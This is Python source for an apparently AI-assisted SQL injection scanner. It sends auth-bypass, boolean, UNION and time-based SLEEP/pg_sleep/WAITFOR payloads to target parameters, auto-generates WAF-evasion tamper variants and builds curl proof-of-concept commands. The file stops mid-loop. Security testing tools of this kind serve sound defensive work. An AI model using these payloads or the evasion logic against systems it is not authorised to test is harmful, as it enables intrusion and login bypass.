"""Main scan orchestration."""

import time
from typing import Callable, Optional

from llmsql.agent import LlmAgent
from llmsql.detector import SqlDetector
from llmsql.http_probe import HttpProbe
from llmsql.models import (
    Finding,
    HttpExchange,
    InjectionPoint,
    InjectionType,
    ParamLocation,
    ScanReport,
    Severity,
)
from llmsql.payloads import SEED_PAYLOADS


def _build_poc(exchange) -> tuple[str, str]:
    """Build a curl PoC + raw HTTP summary from the confirming exchange."""
    from urllib.parse import urlparse
    url = exchange.url
    method = exchange.method.upper()
    hdrs = exchange.request_headers or {}

    # Build header flags once; Content-Type is included here so we must not
    # add it a second time for the POST branch (that caused a duplicate header).
    extra_h = "".join(
        f' -H "{k}: {v}"'
        for k, v in hdrs.items()
        if k.lower() not in ("user-agent", "accept-encoding", "connection", "host")
    )
    if method == "GET":
        curl = f'curl -si "{url}"{extra_h}'
    else:
        import shlex
        # Ensure a Content-Type is present even if the caller didn't set one
        has_ct = any(k.lower() == "content-type" for k in hdrs)
        ct_flag = "" if has_ct else ' -H "Content-Type: application/json"'
        body = exchange.request_body or ""
        curl = (
            f'curl -si -X {method}{extra_h}{ct_flag}'
            f" --data {shlex.quote(body)}"
            f' "{url}"'
        )

    parsed = urlparse(url)
    path_qs = parsed.path + (f"?{parsed.query}" if parsed.query else "")
    raw = f"{method} {path_qs} HTTP/1.1\nHost: {parsed.netloc}\n\n"
    raw += f"→ HTTP {exchange.status_code}\n"
    raw += exchange.response_body[:300]

    return curl, raw


class Scanner:
    """AI-powered SQL injection scanner."""

    def __init__(
        self,
        agent: LlmAgent,
        probe: HttpProbe,
        max_attempts_per_param: int = 8,
        use_llm: bool = True,
        on_progress: Optional[Callable[[str], None]] = None,
        test_path: bool = False,
        path_all_segments: bool = False,
        include_dead: bool = False,
        fast: bool = False,
        guess_params: Optional[list[str]] = None,
        tamper: Optional[list[str]] = None,
        auto_tamper: bool = True,
        show_response: bool = False,
        continue_on_found: bool = False,
        seed_payloads: Optional[list[str]] = None,
        organic: bool = True,
    ):
        self.agent = agent
        self.probe = probe
        self.detector = SqlDetector()
        self.max_attempts = max_attempts_per_param
        self.use_llm = use_llm
        self.on_progress = on_progress or (lambda _: None)
        self.test_path = test_path
        self.path_all_segments = path_all_segments
        self.include_dead = include_dead
        self.fast = fast
        self.guess_params = guess_params
        self.tamper = tamper or []
        self.auto_tamper = auto_tamper
        self.show_response = show_response
        self.continue_on_found = continue_on_found
        self.organic = organic  # mine params from the response itself
        self._seed_payloads = seed_payloads  # None = use default SEED_PAYLOADS
        self._sleep_ms = 3000  # calibrated by CLI --sleep
        # Precheck is always on unless explicitly disabled.
        # In fast mode it's extra important — avoids 22 payloads on dead params.
        self._precheck = True

    def scan(
        self,
        url: str,
        method: str = "GET",
        data: Optional[str] = None,
        content_type: Optional[str] = None,
        extra_headers: Optional[dict[str, str]] = None,
        params: Optional[list[str]] = None,
    ) -> ScanReport:
        """Run full scan against target."""
        start = time.perf_counter()
        report = ScanReport(
            target_url=url,
            llm_model=self.agent.model if self.use_llm else "heuristic-only",
        )

        self.on_progress(f"[*] Target: {url}")
        self.on_progress(f"[*] Method: {method}")

        # Baseline request FIRST — the clean response is what we mine for
        # organically-discovered parameters (forms/links/JS/JSON keys), so we
        # need it before deciding which points to test.
        baseline = self.probe.send(url, method, data, content_type, extra_headers)
        report.add_request(baseline)
        report.add_request()
        self.on_progress(f"[*] Baseline: HTTP {baseline.status_code} ({baseline.response_time_ms:.0f}ms)")

        # Detect DB/backend offline — tell the user clearly rather than silently
        # returning 0 findings for every payload.
        if self.detector.is_db_offline(baseline):
            report.add_error(
                f"DB/backend appears OFFLINE ({baseline.response_body[:120].strip()}) — "
                f"SQLi cannot be detected at runtime. Vulnerability may still exist in code."
            )
            self.on_progress(
                f"[!] DB appears OFFLINE — runtime detection not possible on this URL"
            )
            report.duration_seconds = time.perf_counter() - start
            return report

        # Target unavailable (gateway/overload errors) — the server itself is
        # down, so runtime detection is impossible. Say so clearly rather than
        # reporting a misleading "0 findings".
        if baseline.status_code in (502, 503, 504):
            report.add_error(
                f"Target UNAVAILABLE (HTTP {baseline.status_code}) — server is "
                f"down/overloaded/rate-limited. Cannot test at runtime; retry later."
            )
            self.on_progress(
                f"[!] Target UNAVAILABLE (HTTP {baseline.status_code}) — "
                f"server down/overloaded, cannot scan"
            )
            report.duration_seconds = time.perf_counter() - start
            return report

        # Skip dead endpoints — no point fuzzing a route that doesn't exist
        if not self.include_dead and baseline.status_code in (0, 404, 405, 501):
            report.add_error(
                f"Skipped: baseline HTTP {baseline.status_code} "
                f"(endpoint dead/unroutable; use --include-404 to force)"
            )
            report.duration_seconds = time.perf_counter() - start
            self.on_progress(
                f"[*] Skipping (baseline HTTP {baseline.status_code})"
            )
            return report

        # Skip auth-gated / WAF-blocked baselines — can't test unauthenticated.
        # EXCEPTION: a POST/PUT with credential-like body params (a login attempt)
        # naturally returns 401 to wrong creds — that's the auth-bypass target,
        # not an endpoint we lack access to. Keep testing those.
        has_auth_field = False
        if data:
            _lower_data = data.lower()
            has_auth_field = any(
                k in _lower_data for k in
                ('"email"', '"username"', '"user"', '"password"', '"login"',
                 "email=", "username=", "user=", "password=", "login=")
            )
        is_login_attempt = method.upper() in ("POST", "PUT", "PATCH") and has_auth_field

        if (not self.include_dead and baseline.status_code in (401, 403)
                and not is_login_attempt):
            report.add_error(
                f"Skipped: baseline HTTP {baseline.status_code} "
                f"(auth-gated or WAF-blocked; supply -H 'Authorization: ...' "
                f"or --cookie, or use --include-404 to force)"
            )
            report.duration_seconds = time.perf_counter() - start
            self.on_progress(
                f"[*] Skipping (baseline HTTP {baseline.status_code}, needs auth/bypass)"
            )
            return report

        # Login-wall detection: if an unauthenticated request got bounced to a
        # login page, say so clearly instead of silently reporting 0 findings.
        # (Advisory only — we still scan whatever we can see.)
        if self.detector.looks_like_login_page(baseline):
            from urllib.parse import urlparse as _up_login
            path_l = _up_login(url).path.lower()
            is_login_path = any(
                k in path_l for k in
                ("login", "signin", "sign-in", "auth", "session", "sso", "logon")
            )
            authed = bool(
                (extra_headers and any(k.lower() == "authorization" for k in extra_headers))
                or self.probe.cookies
            )
            if not is_login_path and not authed:
                report.add_error(
                    "Baseline looks like a LOGIN page — this URL likely redirected "
                    "to login because the scan is unauthenticated. Authenticate with "
                    "--login-url/--login-data (CSRF tokens auto-handled) or --cookie."
                )
                self.on_progress(
                    "[!] Login wall detected (redirected to login) — "
                    "authenticate to reach protected pages"
                )

        # Organic parameter discovery: mine the live baseline response for
        # parameter names the target itself advertises (form fields, links,
        # JS fetch URLs, JSON keys). This adapts to arbitrary apps instead of
        # relying on a baked-in wordlist.
        discovered_params: Optional[list[str]] = None
        if self.organic and method.upper() == "GET":
            try:
                ct = baseline.response_headers.get("content-type", "") \
                    if baseline.response_headers else ""
                from llmsql.param_discovery import discover
                names, _param_urls = discover(url, baseline.response_body, ct)
                if names:
                    discovered_params = names
                    report.add_log(
                        f"Organic discovery: {len(names)} param name(s) from response "
                        f"({', '.join(names[:8])}{'...' if len(names) > 8 else ''})"
                    )
                    self.on_progress(
                        f"[*] Discovered {len(names)} parameter name(s) organically "
                        f"from the response"
                    )
            except Exception as e:
                report.add_error(f"Organic discovery failed: {e}")

        # Discover injection points (query/path/body/header/cookie), seeding the
        # organically-discovered names with priority.
        points = self.probe.extract_injection_points(
            url, method, data, content_type, extra_headers,
            test_path=self.test_path,
            path_all_segments=self.path_all_segments,
            guess_params=self.guess_params,
            discovered_params=discovered_params,
        )
        if params:
            allowed = set(params)
            points = [p for p in points if p.name in allowed]

        if not points:
            report.add_error("No injection points found")
            report.duration_seconds = time.perf_counter() - start
            return report

        report.injection_points = points

        import concurrent.futures as _cf

        def _test_one(point):
            return self._test_parameter(
                url, method, data, content_type, extra_headers,
                point, baseline, report,
            )

        # Run param tests concurrently — big speed win when there are many params.
        # Cap at 4 workers to avoid hammering the target. This runs whether or
        # not continue_on_found is set; the only difference is whether we
        # cancel remaining work after the first confirmed finding.
        workers = min(4, len(points))
        if workers > 1:
            with _cf.ThreadPoolExecutor(max_workers=workers) as ex:
                futures = {ex.submit(_test_one, p): p for p in points}
                for fut in _cf.as_completed(futures):
                    try:
                        finding = fut.result()
                    except _cf.CancelledError:
                        continue  # skipped after first finding confirmed
                    except Exception as e:
                        report.add_error(f"Param test error: {e}")
                        continue
                    if finding:
                        report.findings.append(finding)
                        self.on_progress(
                            f"[!] VULNERABLE: {url}\n"
                            f"    Param: {finding.param} ({finding.location.value}) "
                            f"| Type: {finding.injection_type.value} "
                            f"| DB: {finding.db_type or '?'} "
                            f"| Confidence: {finding.confidence:.0%}\n"
                            f"    PoC: {finding.poc_curl}"
                        )
                        if not self.continue_on_found:
                            for f in futures:
                                f.cancel()
        else:
            for point in points:
                if report.findings and not self.continue_on_found:
                    if not getattr(report, '_skip_logged', False):
                        report._skip_logged = True
                        self.on_progress(
                            "[*] SQLi confirmed — skipping remaining parameters"
                        )
                    break
                finding = _test_one(point)
                if finding:
                    report.findings.append(finding)
                    self.on_progress(
                        f"[!] VULNERABLE: {url}\n"
                        f"    Param: {finding.param} ({finding.location.value}) "
                        f"| Type: {finding.injection_type.value} "
                        f"| DB: {finding.db_type or '?'} "
                        f"| Confidence: {finding.confidence:.0%}\n"
                        f"    PoC: {finding.poc_curl}"
                    )

        report.duration_seconds = time.perf_counter() - start
        self.on_progress(
            f"\n[*] Scan complete: {report.total_requests} requests, "
            f"{len(report.findings)} finding(s) in {report.duration_seconds:.1f}s"
        )
        return report

    def _test_parameter(
        self,
        url: str,
        method: str,
        data: Optional[str],
        content_type: Optional[str],
        extra_headers: Optional[dict[str, str]],
        point: InjectionPoint,
        baseline: HttpExchange,
        report: ScanReport,
    ) -> Optional[Finding]:
        """Test a single injection point with LLM-guided payloads."""
        # Local to this parameter's test run (NOT shared via `report` — this
        # method may run concurrently for other parameters on the same report,
        # and stashing scratch state on the shared object was a real race bug).
        interim_findings: list[Finding] = []

        # Quick pre-check: send a single quote before running the full payload suite.
        # If the response is identical to baseline, this param ignores the value.
        # Skip it immediately — avoids 100s of wasted requests on dead params.
        # Auth-bypass probe: fields that look like login credentials (email,
        # username, password) need a FULL 'OR 1=1' style payload to reveal
        # SQLi — a bare quote just fails the login normally (same status as
        # baseline), which would otherwise cause the precheck below to wrongly
        # declare the param "dead" before ever trying the payload that matters.
        _AUTH_FIELD_NAMES = {
            "email", "username", "user", "login", "password", "pass", "pwd",
        }
        if self._precheck and point.name.lower() in _AUTH_FIELD_NAMES:
            bypass_probe = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload="' OR '1'='1'--",
            )
            report.add_request()
            score, evidence = self.detector.quick_score(baseline, bypass_probe)
            if score >= 0.85:
                return self._build_finding(
                    point, bypass_probe, baseline, evidence, score,
                    inj_type=InjectionType.BOOLEAN_BLIND,
                )

        # When the baseline ALREADY errors (e.g. a raw-SQL endpoint like
        # /api/testimonials/count?query=1 that concatenates the value straight
        # into SQL), the normal precheck below is skipped. Do a one-shot inert
        # check so mined/organic params the endpoint simply ignores are dropped
        # after a single request — this both saves the full payload suite and
        # kills the "identical-to-baseline" reflection false positives.
        if self._precheck and self.detector.baseline_already_erroring(baseline):
            orig = point.original_value or ""
            inert_probe = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=orig + "'",
            )
            report.add_request()
            if (inert_probe.status_code == baseline.status_code
                    and inert_probe.response_body == baseline.response_body):
                return None  # param has no effect — identical to baseline

        if self._precheck and not self.detector.baseline_already_erroring(baseline):
            # Inject relative to the ORIGINAL value, not by replacing it. Real
            # SQLi context is preserved by appending: for q=apple the probe
            # sends q=apple' which yields `LIKE '%apple'%'` -> syntax error.
            # Replacing (q=') often returns empty results with no error and
            # misses the vulnerability (confirmed on OWASP Juice Shop search).
            orig = point.original_value or ""
            star_probe = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=orig + "*",
            )
            report.add_request()
            star_score, _ = self.detector.quick_score(baseline, star_probe)

            # Always send the quote probe — it's the primary SQLi signal.
            # (Previously we skipped it when the star probe looked 'dead', which
            # missed error-based SQLi on search endpoints where a wildcard
            # returns empty results but a quote triggers a SQL error.)
            quote_probe = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=orig + "'",
            )
            report.add_request()

            quote_errors = self.detector.find_sql_errors(quote_probe.response_body)
            status_changed = quote_probe.status_code != baseline.status_code

            # Truly dead param: neither the wildcard NOR the quote changed
            # anything (same status, no SQL errors, no body diff). Skip it.
            star_identical = (
                star_score == 0.0 and star_probe.status_code == baseline.status_code
            )
            quote_identical = (
                not quote_errors
                and not status_changed
                and len(quote_probe.response_body) == len(baseline.response_body)
            )
            if star_identical and quote_identical:
                # The param looks inert to '/'*' probes — but an error-suppressed
                # endpoint can still be BOOLEAN-injectable (OR '1'='1 returns all
                # rows, AND '1'='2 returns none) with no error or status change.
                # One OR/AND amplification pair catches that Nuclei-style case
                # before we give up on the param.
                if (200 <= baseline.status_code < 300
                        and point.location.value in ("query", "body", "json")):
                    # A param that looks inert to '/'*' probes can still be a
                    # BLIND injection (boolean or time-based) with no error and
                    # no content change. Run the blind battery before giving up
                    # — both are cheap on genuinely inert params (fast requests).
                    bfind = self._boolean_ratio_detect(
                        url, method, data, content_type, extra_headers,
                        point, baseline, report,
                    )
                    if bfind is not None:
                        return bfind
                    tfind = self._test_time_based(
                        url, method, data, content_type, extra_headers,
                        point, baseline, report,
                    )
                    if tfind is not None:
                        return tfind
                return None  # dead param — ignores its value entirely

            if quote_errors:
                # Explicit SQL error text — confirmed, no ambiguity.
                pre_score, pre_ev = self.detector.quick_score(baseline, quote_probe)
                evidence = pre_ev or f"SQL error: {quote_errors[0][:80]}"
                return self._build_finding(
                    point, quote_probe, baseline, evidence, max(pre_score, 0.85)
                )

            if status_changed:
                # Status changed but no recognisable SQL error text. This is
                # ambiguous — could be real SQLi with a swallowed error, or just
                # "any unexpected input breaks this endpoint" (generic validation).
                #
                # sqlmap-style differential test: send a harmless control value
                # that is equally "weird" (long alphanumeric) but NOT a SQL
                # metacharacter. If it triggers the SAME status change, the
                # break isn't SQL-specific — don't confirm. If the control
                # succeeds normally, the quote-specific failure is a real signal.
                # Rate-limit / WAF short-circuit: don't waste a control request
                # disambiguating a 429 — it's never SQLi, and burning a control +
                # possible full suite on every param during a rate-limit window
                # is what makes scans take minutes on a single slow URL.
                if quote_probe.status_code == 429:
                    return None

                control_probe = self.probe.send(
                    url, method, data, content_type, extra_headers,
                    inject_point=point, payload=orig + "zzz9x8y7w6v5",
                )
                report.add_request()
                control_broke = control_probe.status_code == quote_probe.status_code

                if control_broke:
                    # Generic "any weird value breaks this" — not SQL-specific
                    # (confirmed by the control test). Skip immediately rather
                    # than running the full payload suite, which would waste
                    # dozens of requests chasing a non-SQL error on every
                    # ambiguous param.
                    return None
                else:
                    # Control succeeds, quote breaks it → SQL-specific signal.
                    # Try a comment-based "fix": if closing/commenting the quote
                    # restores normal behaviour, that's strong confirmation the
                    # value lands inside a SQL statement.
                    fix_probe = self.probe.send(
                        url, method, data, content_type, extra_headers,
                        inject_point=point, payload=orig + "'--",
                    )
                    report.add_request()
                    fix_confirms = fix_probe.status_code == baseline.status_code

                    evidence = (
                        f"Status {baseline.status_code} -> {quote_probe.status_code} "
                        f"on quote only (control value succeeded normally)"
                    )
                    if fix_confirms:
                        evidence += "; comment-closing the quote restored normal response"
                    confidence = 0.85 if fix_confirms else 0.7
                    return self._build_finding(
                        point, quote_probe, baseline, evidence, confidence,
                        inj_type=InjectionType.ERROR_BASED,
                    )

            # No SQL errors and no status change — check if quote is more
            # interesting than '*'. If both give the same body-diff score,
            # this param is just dynamic (returns different content for any value).
            pre_score, pre_ev = self.detector.quick_score(baseline, quote_probe)
            if pre_score <= star_score and pre_score < 0.6:
                # Ambiguous: the quote and the wildcard perturb the page about
                # equally, which looks like a merely-dynamic param — but it can
                # also be a BLIND injection where any wrong value returns an
                # empty page. Use the sqlmap-style boolean ratio test to tell
                # them apart (TRUE ~= original AND FALSE != original), then fall
                # back to NoSQL. Both no-op cheaply on genuinely dynamic pages.
                if (200 <= baseline.status_code < 300
                        and point.location.value in ("query", "body", "json")):
                    bfind = self._boolean_ratio_detect(
                        url, method, data, content_type, extra_headers,
                        point, baseline, report,
                    )
                    if bfind is not None:
                        return bfind
                    # Time-based blind: the classic "no error, no content
                    # change" case — the only thing that reveals it is a delay.
                    tfind = self._test_time_based(
                        url, method, data, content_type, extra_headers,
                        point, baseline, report,
                    )
                    if tfind is not None:
                        return tfind
                return self._test_nosql(
                    url, method, data, content_type, extra_headers, point, baseline, report
                )  # None if not NoSQL-injectable either

        if self._seed_payloads is not None:
            payloads = list(self._seed_payloads)
        else:
            payloads = list(SEED_PAYLOADS[:5])

        # In fast mode, skip the per-parameter LLM suggestion call (slow on
        # local models). Rely on seed payloads + heuristics, use the LLM only
        # to confirm strong hits.
        if self.use_llm and not self.fast:
            try:
                llm_payloads = self.agent.suggest_initial_payloads(
                    url, method, point, content_type, baseline
                )
                if llm_payloads:
                    payloads = llm_payloads + payloads
                    report.add_log(
                        f"LLM suggested {len(llm_payloads)} payloads for {point.name}"
                    )
            except Exception as e:
                report.add_error(f"LLM suggest failed for {point.name}: {e}")

        # Apply explicit tamper chain up front, if requested
        if self.tamper:
            from llmsql.tamper import apply_tamper
            payloads = [apply_tamper(p, self.tamper) for p in payloads if isinstance(p, str)]

        seen = set()
        unique_payloads = []
        for p in payloads:
            if not isinstance(p, str):
                continue
            if p not in seen:
                seen.add(p)
                unique_payloads.append(p)

        best_score = 0.0
        best_exchange: Optional[HttpExchange] = None
        best_evidence = ""
        attempts = 0
        real_attempts = 0  # excludes WAF-blocked requests
        blocked = 0
        tamper_triggered = bool(self.tamper)
        # Hard ceiling so tamper expansion can't run away
        request_ceiling = self.max_attempts * 6 + 10

        idx = 0
        while idx < len(unique_payloads):
            # Budget is spent on requests that actually reach the app, not on
            # ones the WAF refuses — otherwise blocked seeds exhaust the budget
            # before tamper variants get a turn.
            if real_attempts >= self.max_attempts or attempts >= request_ceiling:
                break
            payload = unique_payloads[idx]
            idx += 1
            attempts += 1

            injected = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=payload,
            )
            # Tag time-based payloads so the timing detector calibrates threshold
            _sleep_kw = ("sleep", "waitfor", "pg_sleep", "benchmark")
            if any(kw in payload.lower() for kw in _sleep_kw):
                injected.expected_sleep_ms = self._sleep_ms
            report.add_request(injected)
            report.add_request()

            is_blocked = self._is_blocked(baseline, injected)
            if not is_blocked:
                real_attempts += 1

            score, evidence = self.detector.quick_score(baseline, injected)
            self.on_progress(
                f"    [{attempts}] payload={payload[:40]!r} score={score:.2f} "
                f"HTTP {injected.status_code}"
            )
            if self.show_response:
                snippet = injected.response_body[:300].replace("\n", " ")
                self.on_progress(f"        body: {snippet}")

            # WAF/block detection: baseline was OK but payload is refused.
            if is_blocked:
                blocked += 1
                if (self.auto_tamper and not tamper_triggered and blocked >= 2):
                    tamper_triggered = True
                    from llmsql.tamper import AUTO_TAMPER_CHAIN, tamper_variants
                    added = 0
                    for base in list(unique_payloads):
                        for variant in tamper_variants(base, AUTO_TAMPER_CHAIN):
                            if variant not in seen:
                                seen.add(variant)
                                unique_payloads.append(variant)
                                added += 1
                    msg = (
                        f"WAF/filter suspected on {point.name} "
                        f"(baseline {baseline.status_code} -> {injected.status_code}); "
                        f"queued {added} tamper variants"
                    )
                    report.add_log(msg)
                    self.on_progress(f"    [!] {msg}")

            if score > best_score:
                best_score = score
                best_exchange = injected
                best_evidence = evidence

            # Confirmed finding — require strong evidence (0.85+)
            if score >= 0.85:
                finding = self._build_finding(point, injected, baseline, best_evidence, score)
                if finding is not None:
                    if not self.continue_on_found:
                        return finding
                    # continue_on_found: record but keep probing for other inj types
                    interim_findings.append(finding)
                    self.on_progress(
                        f"    [!] confirmed (score {score:.0%}) — continuing for more types"
                    )

            # LLM-guided continuation — skipped in fast mode (heuristics only)
            if self.use_llm and not self.fast and score >= 0.3:
                try:
                    decision = self.agent.analyze_exchange(
                        baseline, injected, point, score, evidence,
                        attempts, self.max_attempts,
                    )
                    report.add_log(
                        f"{point.name}: {decision.action} — {decision.reasoning[:100]}"
                    )

                    if decision.action == "confirm" and decision.confidence >= 0.7:
                        finding = self._build_finding(
                            point, injected, baseline,
                            decision.reasoning or evidence,
                            decision.confidence,
                            db_hint=decision.db_hint,
                            inj_type=decision.injection_type,
                        )
                        if finding is not None:
                            if not self.continue_on_found:
                                return finding
                            interim_findings.append(finding)

                    if decision.action == "inject" and decision.payload:
                        if decision.payload not in seen:
                            unique_payloads.append(decision.payload)
                            report.add_log(
                                f"LLM next payload: {decision.payload[:60]}"
                            )

                    if decision.action in ("skip", "done"):
                        break
                except Exception as e:
                    report.add_error(f"LLM analyze failed: {e}")

        # Final check on best candidate
        if best_exchange and best_score >= 0.6:
            if self.use_llm and not self.fast:
                try:
                    confirm = self.agent.confirm_finding(baseline, best_exchange, point)
                    if confirm.get("vulnerable") and confirm.get("confidence", 0) >= 0.6:
                        raw_type = confirm.get("injection_type", "unknown")
                        try:
                            confirmed_type = InjectionType(raw_type)
                        except ValueError:
                            confirmed_type = self.detector.infer_injection_type(
                                baseline, best_exchange, best_evidence
                            )
                        return Finding(
                            param=point.name,
                            location=point.location,
                            injection_type=confirmed_type,
                            severity=self._map_severity(confirm.get("severity", "medium")),
                            payload=best_exchange.payload or "",
                            evidence=confirm.get("evidence", best_evidence),
                            confidence=float(confirm.get("confidence", best_score)),
                            db_type=confirm.get("db_type"),
                            reasoning=confirm.get("reasoning", ""),
                        )
                except Exception as e:
                    report.add_error(f"LLM confirm failed: {e}")

            if best_score >= 0.75:
                return self._build_finding(
                    point, best_exchange, baseline, best_evidence, best_score
                )

        # Boolean-based detection (OR/AND amplification + true/false pairs).
        # Payloads are POSTFIXED to the original value (Nuclei-style) so the
        # injection lands in the real query context. We run this on any 2xx
        # query/body/json param — not just ones that already reacted to error
        # probes — because boolean-injectable listing/search endpoints often
        # never emit an error. The natural-variance guard below is what keeps
        # this from false-positiving on dynamic/SPA pages.
        is_spa_like = any(seg in url for seg in (
            "/@ng/", "/Edge/", "/Trident/", "/%5C/", "/index.html", "/2fa/",
        ))
        run_bool_blind = (
            not self.fast
            and not is_spa_like
            and point.location.value in ("query", "body", "json")
            and 200 <= baseline.status_code < 300
        )
        if run_bool_blind:
            # sqlmap-style: content-similarity ratios with dynamic-content
            # removal (see _boolean_ratio_detect / compare.py). This replaces
            # the old length-only comparison + reject-on-noise approach.
            bfind = self._boolean_ratio_detect(
                url, method, data, content_type, extra_headers, point, baseline, report
            )
            if bfind is not None:
                return bfind

        # UNION-based detection (reflected marker) — run on params that reacted
        # to injection (best_score >= 0.3) so it's bounded, not on every param.
        if (not self.fast and best_score >= 0.3
                and point.location.value in ("query", "body", "json")):
            ufind = self._test_union(
                url, method, data, content_type, extra_headers, point, baseline, report
            )
            if ufind is not None:
                return ufind

        # Time-based blind (fallback): catches blind injections with no error
        # and no content change. Cheap on non-injectable params.
        if not self.fast and point.location.value in ("query", "body", "json"):
            tfind = self._test_time_based(
                url, method, data, content_type, extra_headers, point, baseline, report
            )
            if tfind is not None:
                return tfind

        # NoSQL injection pair testing (fallback when SQL found nothing).
        nosql_finding = self._test_nosql(
            url, method, data, content_type, extra_headers, point, baseline, report
        )
        if nosql_finding is not None:
            return nosql_finding

        # If continue_on_found, return the highest-confidence interim finding
        if interim_findings:
            return max(interim_findings, key=lambda f: f.confidence)

        return None

    def _boolean_ratio_detect(
        self, url, method, data, content_type, extra_headers, point, baseline, report,
    ) -> Optional[Finding]:
        """sqlmap-style boolean-blind detection via content-similarity ratios.

        1. Send the benign value twice, diff the two responses to find dynamic
           regions (timestamps/tokens) and build a cleaned page template.
        2. If the page is still unstable after stripping, it's too dynamic — bail.
        3. For each AND-based pair (TRUE keeps the original result, FALSE empties
           it), postfix it to the value, strip dynamic content, and compare the
           similarity ratio to the template: a genuine boolean injection shows
           TRUE ~= original while FALSE clearly diverges (the classic sqlmap
           signal), OR the OR-amplification grow/shrink asymmetry.
        """
        from llmsql.compare import (
            DIFF_TOLERANCE, HEAVILY_DYNAMIC_BOUND, UPPER_RATIO_BOUND,
            find_dynamic_markers, ratio, remove_dynamic,
        )
        from llmsql.payloads import BOOLEAN_AND_PAIRS, BOOLEAN_AMPLIFY_PAIRS
        orig = point.original_value or ""

        # 1+2. Dynamic-content markers from two identical benign requests.
        b2 = self.probe.send(
            url, method, data, content_type, extra_headers,
            inject_point=point, payload=orig,
        )
        report.add_request()
        markers = find_dynamic_markers(baseline.response_body, b2.response_body)
        template = remove_dynamic(baseline.response_body, markers)
        self_ratio = ratio(template, remove_dynamic(b2.response_body, markers))
        if self_ratio < HEAVILY_DYNAMIC_BOUND:
            return None  # heavily dynamic even after stripping — unreliable

        # 3. AND-based ratio test + OR amplification, sharing the same requests.
        pairs = BOOLEAN_AND_PAIRS[:4]
        amp_pairs = BOOLEAN_AMPLIFY_PAIRS[:2]
        for i, (true_pl, false_pl) in enumerate(pairs):
            true_ex = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=orig + true_pl,
            )
            false_ex = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=orig + false_pl,
            )
            report.add_request()
            report.add_request()
            # A 500 means we broke syntax → error-based territory, not boolean.
            if true_ex.status_code >= 500 or false_ex.status_code >= 500:
                continue
            if true_ex.status_code != baseline.status_code:
                continue
            tr = ratio(template, remove_dynamic(true_ex.response_body, markers))
            fr = ratio(template, remove_dynamic(false_ex.response_body, markers))
            # TRUE resembles the original page; FALSE clearly diverges from it.
            if tr >= UPPER_RATIO_BOUND and fr < UPPER_RATIO_BOUND and (tr - fr) > DIFF_TOLERANCE:
                ev = (f"Boolean blind (content ratio): TRUE~original={tr:.2f}, "
                      f"FALSE={fr:.2f} (Δ{tr - fr:.2f}); dynamic content stripped")
                return self._build_finding(
                    point, true_ex, baseline, ev, min(0.95, 0.8 + (tr - fr)),
                    inj_type=InjectionType.BOOLEAN_BLIND,
                )
            # OR-amplification (TRUE returns many more rows than FALSE).
            if i < len(amp_pairs):
                amp, amp_ev = self.detector.boolean_amplification_score(
                    baseline, true_ex, false_ex
                )
                if amp >= 0.85:
                    return self._build_finding(
                        point, true_ex, baseline, amp_ev, amp,
                        inj_type=InjectionType.BOOLEAN_BLIND,
                    )
        return None

    def _boolean_amplify_probe(
        self, url, method, data, content_type, extra_headers, point, baseline, report,
        max_pairs: int = 2,
    ) -> Optional[Finding]:
        """Run OR/AND result-amplification pairs (Nuclei-style, postfixed to the
        value) and return a boolean-blind Finding if the OR-true response grows
        while the AND-false response shrinks. Returns None otherwise.
        """
        from llmsql.payloads import BOOLEAN_AMPLIFY_PAIRS
        orig = point.original_value or ""
        for or_pl, and_pl in BOOLEAN_AMPLIFY_PAIRS[:max_pairs]:
            or_ex = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=orig + or_pl,
            )
            and_ex = self.probe.send(
                url, method, data, content_type, extra_headers,
                inject_point=point, payload=orig + and_pl,
            )
            report.add_request()
            report.add_request()
            score, evidence = self.detector.boolean_amplification_score(
                baseline, or_ex, and_ex
            )
            if score >= 0.85:
                return self._build_finding(
                    point, or_ex, baseline, evidence, score,
                    inj_type=InjectionType.BOOLEAN_BLIND,
                )
        return None

    def _natural_variance(
        self, url, method, data, content_type, extra_headers, point, baseline, report
    ) -> float:
        """How much does this endpoint's response vary on its OWN, with no
        injection? Sends a second identical benign request and compares it to
        the baseline (by length AND sampled content). A high value means the
        endpoint is non-deterministic — captcha images, random tokens, rotating
        timestamps — so any true/false 'differential' is noise, not injection.
        """
        orig = point.original_value or ""
        probe = self.probe.send(
            url, method, data, content_type, extra_headers,
            inject_point=point, payload=orig,
        )
        report.add_request()
        a = baseline.response_body or ""
        b = probe.response_body or ""
        m = max(len(a), len(b))
        if m == 0:
            return 0.0
        len_ratio = abs(len(a) - len(b)) / m
        # Content component: sampled char mismatch over the overlap catches
        # random bodies that happen to be the same length (e.g. captcha SVGs).
        n = min(len(a), len(b))
        char_ratio = 0.0
        if n:
            step = max(1, n // 500)
            checked = 0
            mism = 0
            for i in range(0, n, step):
                checked += 1
                if a[i] != b[i]:
                    mism += 1
            char_ratio = mism / checked if checked else 0.0
        return max(len_ratio, char_ratio)

    def _test_time_based(
        self, url, method, data, content_type, extra_headers, point, baseline, report,
    ) -> Optional[Finding]:
        """Time-based blind detection (the technique from the oscuridad Nuclei
        template): inject a ``SLEEP()``/``pg_sleep()``/``WAITFOR DELAY`` across
        several boundary contexts. If the response is delayed by ~the requested
        seconds AND a ``sleep(0)`` control returns fast, it's a confirmed
        time-based injection. This catches BLIND injections that emit no error
        and don't change the page content — which every other technique misses.

        Cheap on non-injectable params (the sleep is a literal string → fast
        response); only genuinely injectable params incur the delay.
        """
        if self.fast:
            return None
        sleep_s = max(1, int(round(self._sleep_ms / 1000)))
        thresh = self._sleep_ms * 0.7
        orig = point.original_value or ""
        # (payload template, control template) — control replaces the delay
        # with an instant one so a slow server/network can't cause a false hit.
        templates = [
            ("' OR SLEEP({s})-- -", "' OR SLEEP(0)-- -"),
            (" OR SLEEP({s})-- -", " OR SLEEP(0)-- -"),
            ("' AND SLEEP({s})-- -", "' AND SLEEP(0)-- -"),
            ("'||pg_sleep({s})-- -", "'||pg_sleep(0)-- -"),
            ("';SELECT pg_sleep({s})-- -", "';SELECT pg_sleep(0)-- -"),
            ("';WAITFOR DELAY '0:0:{s}'-- -", "';WAITFOR DELAY '0:0:0'-- -"),
        ]
        for tpl, ctrl_tpl in templates:
